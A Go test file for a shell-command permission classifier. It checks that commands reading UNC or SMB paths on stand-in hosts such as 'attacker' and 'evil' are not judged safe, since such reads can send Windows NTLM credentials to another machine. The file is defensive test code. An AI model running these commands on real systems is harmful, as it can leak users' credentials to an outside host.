package permission

import "testing"

// A UNC / SMB path makes the OS contact another host (and on Windows send
// the user's NTLM credentials), so reading one is not a local read.
func TestUNCPathArgumentIsNotSafe(t *testing.T) {
	c := NewClassifier()
	for _, cmd := range []string{
		`cat //attacker/share/x`,
		`Get-Content \\evil\x`,
		`ls \\evil\x`,
		`cat "\\evil\share\x"`,
		`head '//evil/share/x'`,
		`git diff --no-index a \\evil\x`,
		`grep --file=//evil/share/p x`,
	} {
		for _, kind := range []ShellKind{"", ShellPOSIX, ShellPowerShell} {
			if got := c.ClassifyLineFor(cmd, kind); got == CatSafe {
				t.Errorf("ClassifyLineFor(%q, %q) = safe, want not safe", cmd, kind)
			}
		}
		if c.IsReadOnlyLine(cmd) {
			t.Errorf("IsReadOnlyLine(%q) = true", cmd)
		}
	}
	for _, cmd := range []string{`cat ./x`, `ls /usr`, `grep -n "// TODO" main.go`, `cat a/b`, `cat \x`} {
		if got := c.ClassifyLineFor(cmd, ShellPOSIX); got != CatSafe {
			t.Errorf("ClassifyLineFor(%q) = %v, want safe", cmd, got)
		}
	}
}
